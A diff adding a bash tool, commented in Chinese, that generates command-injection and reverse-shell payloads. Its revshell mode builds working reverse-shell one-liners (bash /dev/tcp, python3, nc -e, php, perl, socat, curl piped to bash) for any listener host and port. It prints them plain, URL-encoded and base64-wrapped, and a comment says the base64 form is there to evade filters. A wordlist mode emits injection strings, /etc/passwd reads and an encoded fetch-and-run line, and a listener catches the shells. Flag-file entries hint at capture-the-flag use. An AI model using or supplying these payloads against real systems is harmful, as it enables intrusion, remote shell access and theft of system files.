@@ -1,0 +1,158 @@
+#!/usr/bin/env bash
+# cmdi -- 命令注入与反弹 shell 生成器（零依赖：bash + python3）
+# 功能:
+#   revshell <类型> <LHOST> <LPORT>   生成反弹 shell 命令(含 URL 编码变体)
+#   payloads                          命令注入 wordlist(可配 trav/grep 使用)
+#   listen <PORT>                     stdlib TCP 监听器, 替代 nc -lvnp
+
+set -u
+
+usage() {
+    cat <<'EOF'
+cmdi -- 命令注入 payload 生成 + 反弹 shell
+
+用法:
+  cmdi revshell <bash|python3|nc|php|perl|curl|busybox|socat> <LHOST> <LPORT>
+       生成反弹 shell 命令(原样 + URL 编码两份)
+  cmdi payloads
+       打印常用命令注入 wordlist
+  cmdi listen <PORT>
+       TCP 监听器(纯 stdlib), 反弹 shell 的收听后端
+
+例子:
+  cmdi revshell bash 10.0.0.1 4444
+  cmdi listen 4444
+  cmdi payloads | while read p; do curl "http://x/?cmd=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$p")"; done
+EOF
+    exit 1
+}
+
+[ $# -lt 1 ] && usage
+CMD="$1"; shift
+
+case "$CMD" in
+    listen)
+        PORT="${1:-4444}"
+        python3 - "$PORT" <<'PY'
+import socket, sys, threading
+port = int(sys.argv[1])
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("0.0.0.0", port))
+s.listen(5)
+print(f"[*] 监听 0.0.0.0:{port}, Ctrl-C 退出", flush=True)
+while True:
+    try:
+        c, addr = s.accept()
+    except KeyboardInterrupt:
+        break
+    print(f"[+] 连接来自 {addr[0]}:{addr[1]}", flush=True)
+    c.settimeout(1)
+    buf = b""
+    try:
+        while True:
+            try:
+                d = c.recv(4096)
+                if not d:
+                    break
+                buf += d
+                while b"\n" in buf or b"\r" in buf:
+                    i = min(buf.find(b"\n"), buf.find(b"\r")) if b"\n" in buf and b"\r" in buf else (buf.find(b"\n") if b"\n" in buf else buf.find(b"\r"))
+                    line, buf = buf[:i], buf[i + 1:]
+                    print(f"  {addr[0]}: {line.decode('utf-8', 'replace')}", flush=True)
+            except socket.timeout:
+                if buf:
+                    print(f"  {addr[0]}: {buf.decode('utf-8', 'replace')}", flush=True)
+                    buf = b""
+                # 半交互: 允许本机输入发给目标
+                try:
+                    import select
+                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
+                    if r:
+                        line = sys.stdin.readline()
+                        c.sendall(line.encode())
+                except Exception:
+                    pass
+    except Exception as e:
+        print(f"[-] 会话结束: {e}", flush=True)
+    c.close()
+PY
+        ;;
+    revshell)
+        [ $# -ge 2 ] || usage
+        TYPE="$1" LHOST="$2" LPORT="$3"
+        case "$TYPE" in
+            bash)
+                R='bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1'
+                ;;
+            python3)
+                R='python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$LHOST"'",'"$LPORT"'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"''
+                ;;
+            nc)
+                R='nc '"$LHOST"' '"$LPORT"' -e /bin/bash'
+                ;;
+            php)
+                R='php -r '"'"'$sock=fsockopen("'"$LHOST"'",'"$LPORT"');exec("/bin/sh -i <&3 >&3 2>&3");'"'"''
+                ;;
+            perl)
+                R='perl -e '"'"'use Socket;$i="'"$LHOST"'";$p='"$LPORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"'"''
+                ;;
+            curl)
+                R='curl http://'"$LHOST"':'"$LPORT"'/shell.sh|bash'
+                ;;
+            busybox)
+                R='busybox nc '"$LHOST"' '"$LPORT"' -e /bin/sh'
+                ;;
+            socat)
+                R='socat TCP:'"$LHOST"':'"$LPORT"' EXEC:/bin/bash'
+                ;;
+            *) echo "未知类型: $TYPE" >&2; usage ;;
+        esac
+        echo "=== 原样 ==="
+        echo "$R"
+        echo
+        echo "=== URL 编码(直接放 GET 参数) ==="
+        python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$R"
+        echo
+        echo "=== base64(先编码再解码执行, 规避过滤) ==="
+        B64=$(echo -n "$R" | base64 -w0)
+        echo "echo $B64 | base64 -d | bash"
+        ;;
+    payloads)
+        cat <<'EOF'
+# 命令注入 wordlist
+id
+whoami
+ls
+ls -la
+pwd
+uname -a
+cat /etc/passwd
+cat /flag
+cat /flag.txt
+cat /flag/flag
+find / -name "*flag*" 2>/dev/null
+env
+printenv
+echo `id`
+$(id)
+;id
+|id
+||id
+&&id
+`id`
+$(cat /etc/passwd)
+;ls -la /tmp
+|cat /etc/passwd
+||cat /etc/passwd
+&&cat /etc/passwd
+%0aid
+%0aid%0a
+%24(id)
+'id'
+"id"
+;echo Y3VybCBodHRwOi8vWFgvc2hlbGwuc2h8YmFzaA==|base64 -d|bash
+EOF
+        ;;
+    *) usage ;;
+esac
